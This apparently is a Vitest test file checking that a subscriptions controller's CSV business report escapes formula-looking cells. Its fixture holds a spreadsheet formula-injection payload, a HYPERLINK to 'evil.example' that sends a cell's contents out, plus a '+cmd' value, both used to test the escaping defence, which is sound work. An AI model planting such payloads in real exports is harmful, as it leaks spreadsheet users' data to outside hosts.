import { SubscriptionsController } from '@/modules/subscriptions/subscriptions.controller';

describe('SubscriptionsController business report CSV', () => {
  it('neutralises formula-looking vendor and owner cells', async () => {
    const service = {
      getBusinessReport: vi.fn().mockResolvedValue({
        currency: 'USD',
        rows: [
          {
            vendorName: '=HYPERLINK("http://evil.example/?"&A1,"x")',
            owner: '+cmd',
            monthlyCost: 10,
            amount: 120,
            subscriptionCurrency: 'USD',
            frequency: 'annual',
            nextChargeDate: null,
            reviewAt: null,
            riskStatus: 'ok',
          },
        ],
      }),
    };
    const controller = new SubscriptionsController(service as never);
    const res = { setHeader: vi.fn() };

    const csv = (await controller.businessReport('ws-1', { format: 'csv' }, res as never)) as string;

    expect(csv).toContain(`"'=HYPERLINK(""http://evil.example/?""&A1,""x"")","'+cmd",10.00`);
  });
});
